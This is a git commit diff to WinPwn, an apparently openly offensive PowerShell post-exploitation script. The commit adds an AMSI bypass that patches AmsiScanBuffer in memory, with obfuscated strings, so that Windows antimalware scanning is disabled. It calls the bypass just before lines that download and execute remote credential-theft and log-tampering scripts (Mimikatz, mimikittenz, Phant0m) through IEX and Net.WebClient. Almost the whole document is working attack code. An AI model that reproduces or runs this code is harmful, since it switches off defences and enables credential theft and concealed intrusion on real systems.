038a263b4989cf72d2700dafedd6112527f02fc4
SecureThisShit <27858067+SecureThisShit@users.noreply.github.com>
2019-05-13 18:55:16 +0200

    Add AmsiBypass
    https://github.com/rasta-mouse/AmsiScanBufferBypass

--- WinPwn_v0.7.ps1
+++ WinPwn_v0.7.ps1
@@ -7,6 +7,41 @@ function Unzip
     [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
 }
 
+function AmsiBypass
+{
+    <#
+        .DESCRIPTION
+        Amsi bypass by https://github.com/rasta-mouse/AmsiScanBufferBypass
+        License: BSD 3-Clause
+    #>
+    #Privilege Escalation Phase
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+}
+"@
+
+Add-Type $Win32
+
+$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
+$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+}
 
 function dependencychecks
 {
@@ -242,6 +277,7 @@ function kittielocal
     #>
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     pathcheck
+    AmsiBypass
     if (isadmin)
     {
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/mimi.ps1')
@@ -1264,7 +1300,8 @@ __        ___       ____
     }
     Write-Host -ForegroundColor Yellow 'Getting Scripts to Memory'
     
-    dependencychecks        
+    dependencychecks
+    AmsiBypass
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-mimikittenz.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-Phant0m.ps1')
       
